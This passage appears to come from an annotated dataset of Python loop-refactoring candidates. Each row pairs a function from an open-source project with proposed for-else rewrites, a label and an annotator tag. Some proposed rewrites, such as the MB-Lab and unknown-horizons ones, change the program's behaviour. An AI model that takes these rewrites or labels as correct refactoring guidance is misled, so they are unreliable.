    raise CloseSpider()","for page in pages:
    if str(page) == self.conf['END_PAGE']:
        pages = pages[:index + 1]
        break
    index += 1
else:
    msg = ""The provided end page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
    raise CloseSpider()","for page in pages:
    if str(page) == self.conf['END_PAGE']:
        pages = pages[:index + 1]
        break
    index += 1
else:
    msg = ""The provided end page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
    raise CloseSpider()",1,"for page in pages:
    if str(page) == self.conf['END_PAGE']:
        pages = pages[:index + 1]
        exists = True
        break
    index += 1
if not exists:
    msg = ""The provided end page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
    raise CloseSpider()","break statement is executed:None
break statement is not executed:zejun1"
IntelOwl,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/IntelOwl/api_app/analyzers_manager/classes.py,https://github.com/intelowlproject/IntelOwl/tree/master/api_app/analyzers_manager/classes.py,DockerBasedAnalyzer,__poll_for_result$273,"def __poll_for_result(self, req_key: str) -> dict:
        got_result = False
        json_data = {}
        for chance in range(self.max_tries):
            time.sleep(self.poll_distance)
            logger.info(
                f""Result Polling. Try #{chance + 1}. Starting the query...""
                f""<-- {self.__repr__()}""
            )
            try:
                status_code, json_data = self.__query_for_result(self.url, req_key)
            except (requests.RequestException, json.JSONDecodeError) as e:
                raise AnalyzerRunException(e)
            status = json_data.get(""status"", None)
            if status and status == ""running"":
                logger.info(
                    f""Poll number #{chance + 1}, ""
                    f""status: 'running' <-- {self.__repr__()}""
                )
            else:
                got_result = True
                break

        if not got_result:
            raise AnalyzerRunException(""max polls tried without getting any result."")
        return json_data","for chance in range(self.max_tries):
    time.sleep(self.poll_distance)
    logger.info(f'Result Polling. Try #{chance + 1}. Starting the query...<-- {self.__repr__()}')
    try:
        (status_code, json_data) = self.__query_for_result(self.url, req_key)
    except (requests.RequestException, json.JSONDecodeError) as e:
        raise AnalyzerRunException(e)
    status = json_data.get('status', None)
    if status and status == 'running':
        logger.info(f""Poll number #{chance + 1}, status: 'running' <-- {self.__repr__()}"")
    else:
        got_result = True
        break
if not got_result:
    raise AnalyzerRunException('max polls tried without getting any result.')","for chance in range(self.max_tries):
    time.sleep(self.poll_distance)
    logger.info(f'Result Polling. Try #{chance + 1}. Starting the query...<-- {self.__repr__()}')
    try:
        (status_code, json_data) = self.__query_for_result(self.url, req_key)
    except (requests.RequestException, json.JSONDecodeError) as e:
        raise AnalyzerRunException(e)
    status = json_data.get('status', None)
    if status and status == 'running':
        logger.info(f""Poll number #{chance + 1}, status: 'running' <-- {self.__repr__()}"")
    else:
        break
else:
    raise AnalyzerRunException('max polls tried without getting any result.')","for chance in range(self.max_tries):
    time.sleep(self.poll_distance)
    logger.info(f'Result Polling. Try #{chance + 1}. Starting the query...<-- {self.__repr__()}')
    try:
        (status_code, json_data) = self.__query_for_result(self.url, req_key)
    except (requests.RequestException, json.JSONDecodeError) as e:
        raise AnalyzerRunException(e)
    status = json_data.get('status', None)
    if status and status == 'running':
        logger.info(f""Poll number #{chance + 1}, status: 'running' <-- {self.__repr__()}"")
    else:
        break
else:
    raise AnalyzerRunException('max polls tried without getting any result.')",1,"for chance in range(self.max_tries):
    time.sleep(self.poll_distance)
    logger.info(f'Result Polling. Try #{chance + 1}. Starting the query...<-- {self.__repr__()}')
    try:
        (status_code, json_data) = self.__query_for_result(self.url, req_key)
    except (requests.RequestException, json.JSONDecodeError) as e:
        raise AnalyzerRunException(e)
    status = json_data.get('status', None)
    if status and status == 'running':
        logger.info(f""Poll number #{chance + 1}, status: 'running' <-- {self.__repr__()}"")
    else:
        got_result = True
        break
if not got_result:
    raise AnalyzerRunException('max polls tried without getting any result.')","break statement is executed:None
break statement is not executed:zejun1"
MB-Lab,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/MB-Lab/humanoid.py,https://github.com/animate1978/MB-Lab/tree/master//humanoid.py,HumanCategory,get_modifier_tiny_name$142,"def get_modifier_tiny_name(self, sub_categories=[], exclude_in_others=[]):
        # Return the short name minus the beginning
        # of its name corresponding to sub_category
        # The key is subcategory name.
        # The value is [tiny, short, full]
        # Method used only for expressions editor for now
        # exclude_in_others means that the modifiers' name that are in this
        # list can't be put in ""other"" category
        if len(sub_categories) > 0:
            tiny = {'other': []}
            triple = []
            done = False
            false_others = False
            sub_categories = sorted(sub_categories, reverse = True)
            for modif in self.modifiers:
                for sub in sub_categories:
                    if not sub in tiny:
                        tiny[sub] = []
                    if modif.short_name.startswith(sub):
                        triple = [modif.short_name.lstrip(sub), modif.short_name, modif.name]
                        tiny[sub].append(triple)
                        done = True
                        break
                if done:
                    done = False
                else:
                    for fo in exclude_in_others:
                        if modif.short_name.startswith(fo) or modif.short_name.startswith(""ID""):
                            false_others = True
                    if false_others:
                        false_others = False
                    else:
                        tiny['other'].append([modif.short_name, modif.short_name, modif.name])
            return tiny
        return {}","for sub in sub_categories:
    if not sub in tiny:
        tiny[sub] = []
    if modif.short_name.startswith(sub):
        triple = [modif.short_name.lstrip(sub), modif.short_name, modif.name]
        tiny[sub].append(triple)
        done = True
        break
if done:
    done = False
else:
    for fo in exclude_in_others:
        if modif.short_name.startswith(fo) or modif.short_name.startswith('ID'):
            false_others = True
    if false_others:
        false_others = False
    else:
        tiny['other'].append([modif.short_name, modif.short_name, modif.name])","for sub in sub_categories:
    if not sub in tiny:
        tiny[sub] = []
    if modif.short_name.startswith(sub):
        triple = [modif.short_name.lstrip(sub), modif.short_name, modif.name]
        tiny[sub].append(triple)
        done = True
        done = False
        break
else:
    for fo in exclude_in_others:
        if modif.short_name.startswith(fo) or modif.short_name.startswith('ID'):
            false_others = True
    if false_others:
        false_others = False
    else:
        tiny['other'].append([modif.short_name, modif.short_name, modif.name])","for sub in sub_categories:
    if not sub in tiny:
        tiny[sub] = []
    if modif.short_name.startswith(sub):
        triple = [modif.short_name.lstrip(sub), modif.short_name, modif.name]
        tiny[sub].append(triple)
        done = True
        done = False
        break
else:
    for fo in exclude_in_others:
        if modif.short_name.startswith(fo) or modif.short_name.startswith('ID'):
            false_others = True
    if false_others:
        false_others = False
    else:
        tiny['other'].append([modif.short_name, modif.short_name, modif.name])",1,"for sub in sub_categories:
    if not sub in tiny:
        tiny[sub] = []
    if modif.short_name.startswith(sub):
        triple = [modif.short_name.lstrip(sub), modif.short_name, modif.name]
        tiny[sub].append(triple)
        done = True
        break
if done:
    done = False
else:
    for fo in exclude_in_others:
        if modif.short_name.startswith(fo) or modif.short_name.startswith('ID'):
            false_others = True
    if false_others:
        false_others = False
    else:
        tiny['other'].append([modif.short_name, modif.short_name, modif.name])","break statement is executed:zejun1
break statement is not executed:None"
integrations-core,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/integrations-core/zk/tests/conftest.py,https://github.com/DataDog/integrations-core/tree/master/zk/tests/conftest.py,,dd_environment$110,"def dd_environment(get_instance):
    def condition_non_tls():
        sys.stderr.write(""Waiting for ZK to boot...\n"")
        booted = False
        dummy_instance = {'host': HOST, 'port': PORT, 'timeout': 500}
        for _ in range(10):
            try:
                out = ZookeeperCheck('zk', {}, [dummy_instance])._send_command('ruok')
                out.seek(0)
                if out.readline() != 'imok':
                    raise ZKConnectionFailure()
                booted = True
                break
            except ZKConnectionFailure:
                time.sleep(1)

        if not booted:
            raise RetryError(""Zookeeper failed to boot!"")
        sys.stderr.write(""ZK boot complete.\n"")

    is_tls = get_tls()
    compose_file = os.path.join(HERE, 'compose', 'zk.yaml')
    if [3, 5, 0] <= get_version() < [3, 6, 0]:
        compose_file = os.path.join(HERE, 'compose', 'zk35.yaml')
        if is_tls:
            compose_file = os.path.join(HERE, 'compose', 'zk35_ssl.yaml')
    elif get_version() >= [3, 6, 0]:
        compose_file = os.path.join(HERE, 'compose', 'zk36plus.yaml')
        if is_tls:
            compose_file = os.path.join(HERE, 'compose', 'zk36plus_ssl.yaml')

    private_key = os.path.join(HERE, 'compose/client', 'private_key.pem')
    cert = os.path.join(HERE, 'compose/client', 'cert.pem')
    ca_cert = os.path.join(HERE, 'compose/client', 'ca_cert.pem')

    if is_tls:
        condition = [
            CheckDockerLogs(compose_file, patterns=['Starting server', 'Started AdminServer', 'bound to port'])
        ]
    else:
        condition = [condition_non_tls]

    with docker_run(compose_file, conditions=condition, sleep=5):
        yield get_instance, {
            'docker_volumes': [
                '{}:/conf/private_key.pem'.format(private_key),
                '{}:/conf/cert.pem'.format(cert),
                '{}:/conf/ca_cert.pem'.format(ca_cert),
            ]
        }","for _ in range(10):
    try:
        out = ZookeeperCheck('zk', {}, [dummy_instance])._send_command('ruok')
        out.seek(0)
        if out.readline() != 'imok':
            raise ZKConnectionFailure()
        booted = True
        break
    except ZKConnectionFailure:
        time.sleep(1)
if not booted:
    raise RetryError('Zookeeper failed to boot!')","for _ in range(10):
    try:
        out = ZookeeperCheck('zk', {}, [dummy_instance])._send_command('ruok')
        out.seek(0)
        if out.readline() != 'imok':
            raise ZKConnectionFailure()
        break
    except ZKConnectionFailure:
        time.sleep(1)
else:
    raise RetryError('Zookeeper failed to boot!')","for _ in range(10):
    try:
        out = ZookeeperCheck('zk', {}, [dummy_instance])._send_command('ruok')
        out.seek(0)
        if out.readline() != 'imok':
            raise ZKConnectionFailure()
        break
    except ZKConnectionFailure:
        time.sleep(1)
else:
    raise RetryError('Zookeeper failed to boot!')",1,"for _ in range(10):
    try:
        out = ZookeeperCheck('zk', {}, [dummy_instance])._send_command('ruok')
        out.seek(0)
        if out.readline() != 'imok':
            raise ZKConnectionFailure()
        booted = True
        break
    except ZKConnectionFailure:
        time.sleep(1)
if not booted:
    raise RetryError('Zookeeper failed to boot!')","break statement is executed:None
break statement is not executed:zejun1"
data-science-competition,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/data-science-competition/else/天马杯--AI+z智能质检/code/uer/utils/tokenizer.py,https://github.com/DLLXW/data-science-competition/tree/master/else/天马杯--AI+z智能质检/code/uer/utils/tokenizer.py,WordpieceTokenizer,tokenize$350,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.
    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.
    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]
    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.
    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
          if start > 0:
            substr = ""##"" + six.ensure_str(substr)
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
data-science-competition,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/data-science-competition/else/天马杯--AI+z智能质检/code/uer/utils/tokenizer.py,https://github.com/DLLXW/data-science-competition/tree/master/else/天马杯--AI+z智能质检/code/uer/utils/tokenizer.py,WordpieceTokenizer,tokenize$350,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.
    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.
    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]
    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.
    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
          if start > 0:
            substr = ""##"" + six.ensure_str(substr)
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_str(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_str(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_str(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
shuup,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/shuup/shuup/core/models/_product_shops.py,https://github.com/shuup/shuup/tree/master/shuup/core/models/_product_shops.py,ShopProduct,get_orderability_errors_for_simple_variation_parent$491,"def get_orderability_errors_for_simple_variation_parent(self, supplier, customer):
        sellable = False
        for child_product in self.product.variation_children.visible(shop=self.shop, customer=customer):
            try:
                child_shop_product = child_product.get_shop_instance(self.shop)
            except ShopProduct.DoesNotExist:
                continue

            if child_shop_product.is_orderable(
                supplier=supplier,
                customer=customer,
                quantity=child_shop_product.minimum_purchase_quantity,
                allow_cache=False,
            ):
                sellable = True
                break

        if not sellable:
            yield ValidationError(_(""Product has no sellable children.""), code=""no_sellable_children"")","for child_product in self.product.variation_children.visible(shop=self.shop, customer=customer):
    try:
        child_shop_product = child_product.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        sellable = True
        break
if not sellable:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')","for child_product in self.product.variation_children.visible(shop=self.shop, customer=customer):
    try:
        child_shop_product = child_product.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        break
else:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')","for child_product in self.product.variation_children.visible(shop=self.shop, customer=customer):
    try:
        child_shop_product = child_product.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        break
else:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')",1,"for child_product in self.product.variation_children.visible(shop=self.shop, customer=customer):
    try:
        child_shop_product = child_product.get_shop_instance(self.shop)
    except ShopProduct.DoesNotExist:
        continue
    if child_shop_product.is_orderable(supplier=supplier, customer=customer, quantity=child_shop_product.minimum_purchase_quantity, allow_cache=False):
        sellable = True
        break
if not sellable:
    yield ValidationError(_('Product has no sellable children.'), code='no_sellable_children')","break statement is executed:None
break statement is not executed:zejun1"
mlrun,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mlrun/mlrun/runtimes/pod.py,https://github.com/mlrun/mlrun/tree/master/mlrun/runtimes/pod.py,KubeResourceSpec,_prune_tolerations$752,"def _prune_tolerations(
        self,
        tolerations: typing.List[k8s_client.V1Toleration],
        tolerations_field_name: str = ""tolerations"",
    ):
        """"""
        Prunes given tolerations from function spec
        :param tolerations: tolerations to prune
        """"""
        self_tolerations = getattr(self, tolerations_field_name)
        # both needs to exist to prune required tolerations from spec tolerations
        if not tolerations or not self_tolerations:
            return

        # generate a list of tolerations without tolerations to prune
        new_tolerations = []
        for toleration in self_tolerations:
            to_prune = False
            for toleration_to_delete in tolerations:
                if toleration == toleration_to_delete:
                    to_prune = True
                    # no need to keep going over the list provided for the current toleration
                    break
            if not to_prune:
                new_tolerations.append(toleration)

        # Set tolerations without tolerations to prune
        setattr(self, tolerations_field_name, new_tolerations)","for toleration_to_delete in tolerations:
    if toleration == toleration_to_delete:
        to_prune = True
        break
if not to_prune:
    new_tolerations.append(toleration)","for toleration_to_delete in tolerations:
    if toleration == toleration_to_delete:
        break
else:
    new_tolerations.append(toleration)","for toleration_to_delete in tolerations:
    if toleration == toleration_to_delete:
        break
else:
    new_tolerations.append(toleration)",1,"for toleration_to_delete in tolerations:
    if toleration == toleration_to_delete:
        to_prune = True
        break
if not to_prune:
    new_tolerations.append(toleration)","break statement is executed:None
break statement is not executed:zejun1"
platformio-core,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/platformio-core/platformio/builder/tools/piolib.py,https://github.com/platformio/platformio-core/tree/master/platformio/builder/tools/piolib.py,ProjectAsLibBuilder,install_dependencies$955,"def install_dependencies(self):
        def _is_builtin(spec):
            for lb in self.env.GetLibBuilders():
                if lb.name == spec:
                    return True
            return False

        not_found_specs = []
        for spec in self.dependencies:
            # check if built-in library
            if _is_builtin(spec):
                continue

            found = False
            for storage_dir in self.env.GetLibSourceDirs():
                lm = LibraryPackageManager(storage_dir)
                if lm.get_package(spec):
                    found = True
                    break
            if not found:
                not_found_specs.append(spec)

        did_install = False
        lm = LibraryPackageManager(
            self.env.subst(os.path.join(""$PROJECT_LIBDEPS_DIR"", ""$PIOENV""))
        )
        for spec in not_found_specs:
            try:
                lm.install(spec)
                did_install = True
            except (HTTPClientError, UnknownPackageError, InternetIsOffline) as exc:
                click.secho(""Warning! %s"" % exc, fg=""yellow"")

        # reset cache
        if did_install:
            DefaultEnvironment().Replace(__PIO_LIB_BUILDERS=None)","for storage_dir in self.env.GetLibSourceDirs():
    lm = LibraryPackageManager(storage_dir)
    if lm.get_package(spec):
        found = True
        break
if not found:
    not_found_specs.append(spec)","for storage_dir in self.env.GetLibSourceDirs():
    lm = LibraryPackageManager(storage_dir)
    if lm.get_package(spec):
        break
else:
    not_found_specs.append(spec)","for storage_dir in self.env.GetLibSourceDirs():
    lm = LibraryPackageManager(storage_dir)
    if lm.get_package(spec):
        break
else:
    not_found_specs.append(spec)",1,"for storage_dir in self.env.GetLibSourceDirs():
    lm = LibraryPackageManager(storage_dir)
    if lm.get_package(spec):
        found = True
        break
if not found:
    not_found_specs.append(spec)","break statement is executed:None
break statement is not executed:zejun1"
unknown-horizons,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/unknown-horizons/horizons/ai/aiplayer/villagebuilder.py,https://github.com/unknown-horizons/unknown-horizons/tree/master/horizons/ai/aiplayer/villagebuilder.py,VillageBuilder,_get_possible_building_positions$233,"def _get_possible_building_positions(self, section_coords_set, size):
		""""""Return {(x, y): Rect, ...} that contains every size x size potential building location where only the provided coordinates are legal.""""""
		result = {}
		for (x, y) in sorted(section_coords_set):
			ok = True
			for dx in range(size[0]):
				for dy in range(size[1]):
					coords = (x + dx, y + dy)
					if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
						ok = False
						break
				if not ok:
					break
			if ok:
				result[(x, y)] = Rect.init_from_topleft_and_size_tuples((x, y), size)
		return result","for dx in range(size[0]):
    for dy in range(size[1]):
        coords = (x + dx, y + dy)
        if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
            ok = False
            break
    if not ok:
        break
if ok:
    result[x, y] = Rect.init_from_topleft_and_size_tuples((x, y), size)","for dx in range(size[0]):
    for dy in range(size[1]):
        coords = (x + dx, y + dy)
        if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
            ok = False
            break
    if not ok:
        break
else:
    result[x, y] = Rect.init_from_topleft_and_size_tuples((x, y), size)","for dx in range(size[0]):
    for dy in range(size[1]):
        coords = (x + dx, y + dy)
        if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
            ok = False
            break
    if not ok:
        break
else:
    result[x, y] = Rect.init_from_topleft_and_size_tuples((x, y), size)",1,"for dx in range(size[0]):
    for dy in range(size[1]):
        coords = (x + dx, y + dy)
        if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
            ok = False
            break
    if not ok:
        break
if ok:
    result[x, y] = Rect.init_from_topleft_and_size_tuples((x, y), size)","break statement is executed:None
break statement is not executed:zejun1"
unknown-horizons,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/unknown-horizons/horizons/ai/aiplayer/villagebuilder.py,https://github.com/unknown-horizons/unknown-horizons/tree/master/horizons/ai/aiplayer/villagebuilder.py,VillageBuilder,_get_possible_building_positions$233,"def _get_possible_building_positions(self, section_coords_set, size):
		""""""Return {(x, y): Rect, ...} that contains every size x size potential building location where only the provided coordinates are legal.""""""
		result = {}
		for (x, y) in sorted(section_coords_set):
			ok = True
			for dx in range(size[0]):
				for dy in range(size[1]):
					coords = (x + dx, y + dy)
					if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
						ok = False
						break
				if not ok:
					break
			if ok:
				result[(x, y)] = Rect.init_from_topleft_and_size_tuples((x, y), size)
		return result","for dy in range(size[1]):
    coords = (x + dx, y + dy)
    if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
        ok = False
        break
if not ok:
    break","for dy in range(size[1]):
    coords = (x + dx, y + dy)
    if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
        ok = False
        break
else:
    break",Cannot refactor,-1,"for dy in range(size[1]):
    coords = (x + dx, y + dy)
    if coords not in section_coords_set or not self.land_manager.coords_usable(coords):
        ok = False
        break
if not ok:
    break","break statement is executed:None
break statement is not executed:zejun1"
freeipa,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/freeipa/ipaserver/install/ipa_cacert_manage.py,https://github.com/freeipa/freeipa/tree/master/ipaserver/install/ipa_cacert_manage.py,CACertManage,_delete_by_nickname$483,"def _delete_by_nickname(self, nicknames, options):
        conn = api.Backend.ldap2

        ca_certs = certstore.get_ca_certs_nss(api.Backend.ldap2,
                                              api.env.basedn,
                                              api.env.realm,
                                              False)

        ipa_ca_nickname = get_ca_nickname(api.env.realm)

        for nickname in nicknames:
            found = False
            for _ca_cert, ca_nickname, _ca_trust_flags in ca_certs:
                if ca_nickname == nickname:
                    if ca_nickname == ipa_ca_nickname:
                        raise admintool.ScriptError(
                            'The IPA CA cannot be removed with this tool'
                        )
                    else:
                        found = True
                        break

            if not found:
                raise admintool.ScriptError(
                    'Unknown CA \'{}\''.format(nickname)
                )

        with certs.NSSDatabase() as tmpdb:
            tmpdb.create_db()
            for ca_cert, ca_nickname, ca_trust_flags in ca_certs:
                tmpdb.add_cert(ca_cert, ca_nickname, ca_trust_flags)
            loaded = tmpdb.list_certs()
            logger.debug(""loaded raw certs '%s'"", loaded)

            for nickname in nicknames:
                tmpdb.delete_cert(nickname)

            for ca_nickname, _trust_flags in loaded:
                if ca_nickname in nicknames:
                    continue
                if ipa_ca_nickname in nicknames:
                    raise admintool.ScriptError(
                        ""The IPA CA cannot be removed"")
                logger.debug(""Verifying %s"", ca_nickname)
                try:
                    tmpdb.verify_ca_cert_validity(ca_nickname)
                except ValueError as e:
                    msg = ""Verifying \'%s\' failed. Removing part of the "" \
                          ""chain? %s"" % (nickname, e)
                    if options.force:
                        print(msg)
                        continue
                    raise admintool.ScriptError(msg)
                else:
                    logger.debug(""Verified %s"", ca_nickname)

        for _ca_cert, ca_nickname, _ca_trust_flags in ca_certs:
            if ca_nickname in nicknames:
                container_dn = DN(('cn', 'certificates'), ('cn', 'ipa'),
                                  ('cn', 'etc'), api.env.basedn)
                dn = DN(('cn', nickname), container_dn)
                logger.debug(""Deleting %s"", ca_nickname)
                conn.delete_entry(dn)
                return","for (_ca_cert, ca_nickname, _ca_trust_flags) in ca_certs:
    if ca_nickname == nickname:
        if ca_nickname == ipa_ca_nickname:
            raise admintool.ScriptError('The IPA CA cannot be removed with this tool')
        else:
            found = True
            break
if not found:
    raise admintool.ScriptError(""Unknown CA '{}'"".format(nickname))","for (_ca_cert, ca_nickname, _ca_trust_flags) in ca_certs:
    if ca_nickname == nickname:
        if ca_nickname == ipa_ca_nickname:
            raise admintool.ScriptError('The IPA CA cannot be removed with this tool')
        else:
            break
else:
    raise admintool.ScriptError(""Unknown CA '{}'"".format(nickname))","for (_ca_cert, ca_nickname, _ca_trust_flags) in ca_certs:
    if ca_nickname == nickname:
        if ca_nickname == ipa_ca_nickname:
            raise admintool.ScriptError('The IPA CA cannot be removed with this tool')
        else:
            break
else:
    raise admintool.ScriptError(""Unknown CA '{}'"".format(nickname))",1,"for (_ca_cert, ca_nickname, _ca_trust_flags) in ca_certs:
    if ca_nickname == nickname:
        if ca_nickname == ipa_ca_nickname:
            raise admintool.ScriptError('The IPA CA cannot be removed with this tool')
        else:
            found = True
            break
if not found:
    raise admintool.ScriptError(""Unknown CA '{}'"".format(nickname))","break statement is executed:None
break statement is not executed:zejun1"
youtube-dl,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/youtube-dl/youtube_dl/extractor/theplatform.py,https://github.com/lrvick/youtube-dl/tree/master/youtube_dl/extractor/theplatform.py,ThePlatformIE,_real_extract$235,"def _real_extract(self, url):
        url, smuggled_data = unsmuggle_url(url, {})
        self._initialize_geo_bypass({
            'countries': smuggled_data.get('geo_countries'),
        })

        mobj = re.match(self._VALID_URL, url)
        provider_id = mobj.group('provider_id')
        video_id = mobj.group('id')

        if not provider_id:
            provider_id = 'dJ5BDC'

        path = provider_id + '/'
        if mobj.group('media'):
            path += mobj.group('media')
        path += video_id

        qs_dict = compat_parse_qs(compat_urllib_parse_urlparse(url).query)
        if 'guid' in qs_dict:
            webpage = self._download_webpage(url, video_id)
            scripts = re.findall(r'<script[^>]+src=""([^""]+)""', webpage)
            feed_id = None
            # feed id usually locates in the last script.
            # Seems there's no pattern for the interested script filename, so
            # I try one by one
            for script in reversed(scripts):
                feed_script = self._download_webpage(
                    self._proto_relative_url(script, 'http:'),
                    video_id, 'Downloading feed script')
                feed_id = self._search_regex(
                    r'defaultFeedId\s*:\s*""([^""]+)""', feed_script,
                    'default feed id', default=None)
                if feed_id is not None:
                    break
            if feed_id is None:
                raise ExtractorError('Unable to find feed id')
            return self.url_result('http://feed.theplatform.com/f/%s/%s?byGuid=%s' % (
                provider_id, feed_id, qs_dict['guid'][0]))

        if smuggled_data.get('force_smil_url', False):
            smil_url = url
        # Explicitly specified SMIL (see https://github.com/ytdl-org/youtube-dl/issues/7385)
        elif '/guid/' in url:
            headers = {}
            source_url = smuggled_data.get('source_url')
            if source_url:
                headers['Referer'] = source_url
            request = sanitized_Request(url, headers=headers)
            webpage = self._download_webpage(request, video_id)
            smil_url = self._search_regex(
                r'<link[^>]+href=([""\'])(?P<url>.+?)\1[^>]+type=[""\']application/smil\+xml',
                webpage, 'smil url', group='url')
            path = self._search_regex(
                r'link\.theplatform\.com/s/((?:[^/?#&]+/)+[^/?#&]+)', smil_url, 'path')
            smil_url += '?' if '?' not in smil_url else '&' + 'formats=m3u,mpeg4'
        elif mobj.group('config'):
            config_url = url + '&form=json'
            config_url = config_url.replace('swf/', 'config/')
            config_url = config_url.replace('onsite/', 'onsite/config/')
            config = self._download_json(config_url, video_id, 'Downloading config')
            if 'releaseUrl' in config:
                release_url = config['releaseUrl']
            else:
                release_url = 'http://link.theplatform.com/s/%s?mbr=true' % path
            smil_url = release_url + '&formats=MPEG4&manifest=f4m'
        else:
            smil_url = 'http://link.theplatform.com/s/%s?mbr=true' % path

        sig = smuggled_data.get('sig')
        if sig:
            smil_url = self._sign_url(smil_url, sig['key'], sig['secret'])

        formats, subtitles = self._extract_theplatform_smil(smil_url, video_id)
        self._sort_formats(formats)

        ret = self._extract_theplatform_metadata(path, video_id)
        combined_subtitles = self._merge_subtitles(ret.get('subtitles', {}), subtitles)
        ret.update({
            'id': video_id,
            'formats': formats,
            'subtitles': combined_subtitles,
        })

        return ret","for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
